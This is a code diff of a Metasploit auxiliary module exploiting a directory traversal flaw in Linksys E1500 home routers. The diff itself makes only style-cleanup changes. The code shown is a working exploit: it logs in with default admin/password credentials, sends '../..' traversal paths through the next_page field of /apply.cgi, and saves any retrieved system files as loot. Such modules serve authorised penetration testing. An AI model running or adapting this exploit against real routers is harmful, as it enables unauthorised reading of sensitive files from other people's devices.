@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,17 +7,16 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
       'Name'        => 'Linksys E1500 Directory Traversal Vulnerability',
-      'Description' => %q{
+      'Description' => %q(
           This module exploits a directory traversal vulnerability which is present in
         different Linksys home routers, like the E1500.
-      },
+      ),
       'References'  =>
         [
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ],
@@ -31,66 +31,61 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
-        OptString.new('HttpPassword',[ true, 'Password to login with', 'password']),
+        OptPath.new('SENSITIVE_FILES', [ true, "File containing senstive files, one per line",
+                                         File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
+        OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword', [ true, 'Password to login with', 'password'])
 
-      ], self.class)
+      ], self.class
+    )
   end
 
   def extract_words(wordfile)
     return [] unless wordfile && File.readable?(wordfile)
     begin
-      words = File.open(wordfile, "rb") do |f|
-        f.read
-      end
+      words = File.open(wordfile, "rb", &:read)
     rescue
       return []
     end
     save_array = words.split(/\r?\n/)
-    return save_array
+    save_array
   end
 
-  def find_files(file,user,pass)
+  def find_files(file, user, pass)
     uri = "/apply.cgi"
     traversal = '../..'
     data_trav = "submit_type=wsc_method2&change_action=gozila_cgi&next_page=" << traversal << file
-    res = send_request_cgi({
-      'method'  => 'POST',
-      'uri'     => uri,
-      'authorization' => basic_auth(user,pass),
-      'vars_post' => {
-        "submit_type" => "wsc_method2",
-        "change_action" => "gozila_cgi",
-        "next_page" => traversal << file
-      }
-    })
+    res = send_request_cgi('method' => 'POST',
+                           'uri' => uri,
+                           'authorization' => basic_auth(user, pass),
+                           'vars_post' => {
+                             "submit_type" => "wsc_method2",
+                             "change_action" => "gozila_cgi",
+                             "next_page" => traversal << file
+                           })
 
     # without res.body.length we get lots of false positives
-    if (res and res.code == 200 and res.body.length > 0)
+    if res && (res.code == 200) && !res.body.empty?
       print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
-      report_web_vuln({
-          :host => rhost,
-          :port => rport,
-          :vhost => datastore['VHOST'],
-          :path => uri,
-          :pname => data_trav,
-          :risk => 3,
-          :proof => data_trav,
-          :name => self.fullname,
-          :category => "web",
-          :method => "POST"
-      })
+      report_web_vuln(host: rhost,
+                      port: rport,
+                      vhost: datastore['VHOST'],
+                      path: uri,
+                      pname: data_trav,
+                      risk: 3,
+                      proof: data_trav,
+                      name: fullname,
+                      category: "web",
+                      method: "POST")
 
-      loot = store_loot("linksys.traversal.data","text/plain", rhost, res.body, file)
+      loot = store_loot("linksys.traversal.data", "text/plain", rhost, res.body, file)
       vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
-    elsif (res and res.code)
+    elsif res && res.code
       vprint_error("#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     user = datastore['HttpUsername']
     pass = datastore['HttpPassword']
 
@@ -98,15 +93,13 @@ class MetasploitModule < Msf::Auxiliary
 
     # test login
     begin
-      res = send_request_cgi({
-        'uri' => '/',
-        'method' => 'GET',
-        'authorization' => basic_auth(user,pass)
-      })
+      res = send_request_cgi('uri' => '/',
+                             'method' => 'GET',
+                             'authorization' => basic_auth(user, pass))
 
       return if res.nil?
-      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /httpd/)
-      return if (res.code == 404)
+      return if res.headers['Server'].nil? || res.headers['Server'] !~ /httpd/
+      return if res.code == 404
 
       if [200, 301, 302].include?(res.code)
         vprint_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
